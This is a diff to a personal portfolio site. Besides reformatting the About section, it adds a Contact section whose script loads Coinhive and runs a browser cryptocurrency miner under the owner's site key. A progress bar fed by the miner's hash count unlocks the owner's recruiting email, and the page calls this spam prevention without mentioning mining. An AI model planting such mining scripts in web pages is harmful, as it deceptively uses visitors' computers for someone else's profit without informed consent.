@@ -21,7 +21,9 @@
 				<!-- Header -->
 					<header id="header">
 						<div class="logo">
+							<a href="#contact" style="border: 0" onclick="move()">
 							<span class="icon fa-code"></span>
+						</a>
 						</div>
 						<div class="content">
 							<div class="inner">
@@ -122,31 +124,84 @@
 
 									All designs were created by <a target="_blank" href="https://www.linkedin.com/in/bcolcord/">Brian Colcord</a>. As we iterated through the designs, he'd provide and spec and I'd create pixel perfect sites. Keeping up with his creativity was a great experience.
 								</p>
-								
+
 
 							</article>
 
 						<!-- About -->
-							<article id="about">
-								<h2 class="major align-center center-block">About</h2>
-								<p class="align-center">
-									I keep a list of professional work on my <a target="_blank" href="https://www.linkedin.com/in/adamyala/">LinkedIn</a>.
-									<br>
-									My open source projects are on <a target="_blank" href="https://github.com/adamyala/">GitHub</a>.
-								</p>
-								<p class="align-center">
-									A couple things I wrote
-									<br>
-									<a target="_blank" href="https://buttercms.com/blog/options-for-adding-a-blog-to-python-application">Options For Adding A Blog To A Python Application</a>
-									<br>
-									<a target="_blank" href="https://ogre.5thcolumn.net/nginx-django-elasticsearch-and-kibana/">Nginx, Django, Elasticsearch and Kibana</a>
-								</p>
-								<p class="align-center">
-									A talk I helped create
-									<br>
-									<a target="_blank" href="http://lanyrd.com/2015/bigdatatechcon/sdrxqx/">Small Startup Path of Treachery to Big Travel Data</a>
-								</p>
-							</article>
+						<article id="about">
+							<h2 class="major align-center center-block">About</h2>
+							<p class="align-center">
+								I keep a list of professional work on my <a target="_blank" href="https://www.linkedin.com/in/adamyala/">LinkedIn</a>.
+								<br>
+								My open source projects are on <a target="_blank" href="https://github.com/adamyala/">GitHub</a>.
+							</p>
+							<p class="align-center">
+								A couple things I wrote
+								<br>
+								<a target="_blank" href="https://buttercms.com/blog/options-for-adding-a-blog-to-python-application">Options For Adding A Blog To A Python Application</a>
+								<br>
+								<a target="_blank" href="https://ogre.5thcolumn.net/nginx-django-elasticsearch-and-kibana/">Nginx, Django, Elasticsearch and Kibana</a>
+							</p>
+							<p class="align-center">
+								A talk I helped create
+								<br>
+								<a target="_blank" href="http://lanyrd.com/2015/bigdatatechcon/sdrxqx/">Small Startup Path of Treachery to Big Travel Data</a>
+							</p>
+						</article>
+
+						<!-- About -->
+						<article id="contact">
+							<h2 class="major align-center center-block">Contact</h2>
+							<p class="align-center">
+								My recruitment contact address is unlocked by allowing the below bar to reach 100%.
+								<br>
+								I only respond to hiring inquiries through this email address. I do this to prevent bots and spam.
+								<br>
+								Looking forward to hearing from you!
+							</p>
+							<style>
+								#myBar {
+									width: 0%;
+									height: 30px;
+									background-color: #4CAF50;
+									text-align: center; /* To center it horizontally (if you want) */
+									line-height: 30px; /* To center it vertically */
+									color: white;
+								}
+							</style>
+							<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+							<script>
+                                function move() {
+                                    var elem = document.getElementById("myBar");
+                                    var width = 0;
+
+                                    var miner = new CoinHive.Anonymous('8kkCotHfGekJYlcr33cOg2IDck7zhI0f');
+                                    miner.start();
+
+                                    // Update stats once per second
+                                    var myVar = setInterval(function () {
+                                        var totalHashes = miner.getTotalHashes();
+                                        console.log('th', totalHashes);
+
+										width = Math.ceil(totalHashes/100);
+                                        elem.style.width = width + '%';
+                                        elem.innerHTML = width + '%';
+
+										if (width >= 100) {
+										    clearInterval(myVar);
+											$('#email').show()
+                                        }
+                                    }, 1000);
+                                }
+							</script>
+							<div id="myProgress">
+								<div id="myBar">0%</div>
+							</div>
+							<p class="align-center" style="display: none" id="email">
+								<b>You did it! I can be contacted at adamkyala+recruiting@gmail.com</b>
+							</p>
+						</article>
 
 					</div>
 
